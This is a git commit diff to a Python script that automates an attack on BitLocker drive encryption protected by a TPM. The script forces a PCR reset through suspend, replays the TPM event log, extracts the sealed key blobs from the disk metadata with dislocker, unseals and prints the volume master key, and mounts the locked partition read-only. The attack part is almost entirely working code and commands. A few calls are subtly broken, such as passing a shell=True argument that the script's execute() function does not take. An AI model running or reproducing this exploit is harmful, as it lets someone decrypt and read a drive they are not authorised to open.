256f1ba1a49e90aa320f1082b4df541505fffd89
Edward J. Schwartz <eschwartz@cert.org>
2023-05-31 15:05:19 -0400

    A lot of automation!

--- tester.py
+++ tester.py
@@ -35,6 +35,10 @@ def color_print(message, color):
 def info_print(message):
     color_print(message, BOLD)
 
+def execute(cmd):
+    info_print("Executing command '%s'\n" % cmd)
+    return subprocess.check_output(cmd, shell=True)
+
 def replay_event_log(output, hashtype = 'sha256'):
 
     info_print("Replaying TPM event log\n")
@@ -67,8 +71,7 @@ def replay_event_log(output, hashtype = 'sha256'):
         #print("PCR %d: HASH:%s" % (pcr, hash))
         info_print("Extending PCR 7 with %s\n" % hash)
         cmd = "sudo tpm2_pcrextend %d:%s=%s" % (pcr, hashtype, hash)
-        print(cmd)
-        subprocess.run(cmd, shell=True)
+        execute(cmd)
 
 
 def parse_event_log():
@@ -172,16 +175,108 @@ def reset_pcrs():
     info_print("Awake, restoring hierarchy\n")
     wait()
     subprocess.run("sleep %d" % WAIT_TIME, shell=True)
-    subprocess.run("tpm2_hierarchycontrol -C p shEnable set", shell=True)
-    subprocess.run("tpm2_hierarchycontrol -C p ehEnable set", shell=True)
+    execute("tpm2_hierarchycontrol -C p shEnable set", shell=True)
+    execute("tpm2_hierarchycontrol -C p ehEnable set", shell=True)
 
-#def suspend():
-#    info_print('Sleeping for a few seconds\n')
-#    subprocess.check_output('sudo rtcwake -m mem -s %d' % AFEW, shell=True)
+def get_drive_path():
+    # Searching for BitLocker-locked partitions
+    info_print('Search for BitLocker-locked partitions.\n')
 
-#    info_print('Waking up\n')
+    if len(sys.argv) != 2:
+        output = subprocess.check_output('sudo fdisk -l 2>/dev/null | grep "Microsoft basic data"', shell=True).splitlines()
+        if len(output) == 0:
+            color_print('    [>>] BitLocker-locked partition is not found.\n', FAIL)
+            info_print('    [>>] Please try with the explicit drive path. ./bitleaker.py <drive path>\n')
+            sys.exit(-1)
 
-#    sleep(1)
+        drive_path = output[0].split(b' ')[0]
+    else:
+        drive_path = sys.argv[1]
+
+    drive_path = drive_path.decode("utf8")
+
+    info_print('    [>>] BitLocker-locked partition is [%s]\n\n' % drive_path)
+
+    return drive_path
+
+def unseal(drive):
+    dislocker_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "dislocker/src/dislocker")
+    dislocker_output = execute("%s-metadata -v -v -v -V %s" % (dislocker_path, drive)).splitlines()
+
+    found_tpm = False
+    found_hex = False
+    all_bytes = b""
+    for l in dislocker_output:
+        #print(l)
+
+        if found_tpm:
+            if b"[DEBUG] 0x0000" in l:
+                found_hex = True
+                #print(l)
+                l = l.replace(b"-", b" ")
+                new_bytes = bytes([int("0x%s" % b.decode(), 16) for b in l.split(b" ")[7:-1]])
+                all_bytes = all_bytes + new_bytes
+                #
+                # pub_size = int.from_bytes(all_bytes[pub_offset:pub_offset+2], "big")
+                # print(pub_size)print(new_bytes.hex())
+            elif found_hex:
+                break
+
+        if b"TPM_ENCODED" in l:
+            found_tpm = True
+
+    # Get pub.bin and priv.bin?
+    priv_size = int.from_bytes(all_bytes[0:2], "big")
+    priv_key = all_bytes[0:2+priv_size]
+    #print(priv_key.hex())
+
+    pub_offset = priv_size + 2
+    pub_size = int.from_bytes(all_bytes[pub_offset:pub_offset+2], "big")
+    pub_key = all_bytes[pub_offset:pub_offset+2+pub_size]
+    #print(pub_key.hex())
+
+    with open("/tmp/priv.bin", "wb") as f:
+        f.write(priv_key)
+    with open("/tmp/pub.bin", "wb") as f:
+        f.write(pub_key)
+
+    # tpm2_load -C 0x81000001 -u pub.bin -r priv.bin -c key.ctx
+    # tpm2_startauthsession --policy-session -S session.dat
+    # tpm2_policyauthvalue -S session.dat
+    # tpm2_policypcr -S session.dat -l sha256:7,11
+    # tpm2_unseal -c key.ctx -p session:session.dat -o key.bin
+    
+    info_print("Loading sealed key into TPM\n")
+    execute("tpm2_load -C 0x81000001 -u /tmp/pub.bin -r /tmp/priv.bin -c /tmp/key.ctx")
+
+    info_print("Starting auth session\n")
+    execute("tpm2_startauthsession --policy-session -S /tmp/session.dat")
+    execute("tpm2_policyauthvalue -S /tmp/session.dat")
+    execute("tpm2_policypcr -S /tmp/session.dat -l sha256:7,11")
+
+    info_print("Unsealing VMK key\n")
+    execute("tpm2_unseal -c /tmp/key.ctx -p session:/tmp/session.dat -o /tmp/key.bin")
+
+    execute("dd bs=1 if=/tmp/key.bin of=/tmp/vmk.bin skip=12")
+
+    with open("/tmp/vmk.bin", "rb") as f:
+        vmk = f.read()
+
+    info_print("The VMK key is: %s\n" % vmk.hex())
+
+    info_print("Running dislocker\n")
+    execute("mkdir -p /tmp/mnt")
+
+    # Re-entrancy...
+    execute("umount /mnt/dislocker || true")
+    execute("umount /tmp/mnt || true")
+
+    execute("%s-fuse -K /tmp/vmk.bin %s -- /tmp/mnt" % (dislocker_path, drive))
+    execute("mkdir -p /mnt/dislocker")
+    execute("mount -o ro,loopback /tmp/mnt/dislocker-file /mnt/dislocker")
+
+
+    info_print("The BitLocker volume is opened in /mnt/dislocker\n")
 
 output = get_pcrs()
 
@@ -220,9 +315,14 @@ for pcr in output[hash].keys():
 if not zero:
     color_print("Machine does not appear to be vulnerable\n", FAIL)
 
+info_print("Replaying event log...\n")
 log = parse_event_log()
 #print(log)
 replay_event_log(log)
+#subprocess.check_output("tpm2_pcrread sha256:7", shell=True)
 #sys.exit(1)
 
-subprocess.check_output("sudo tpm2_pcrread sha256:7", shell=True)
+unseal(get_drive_path())
+
+
+drive = get_drive_path()
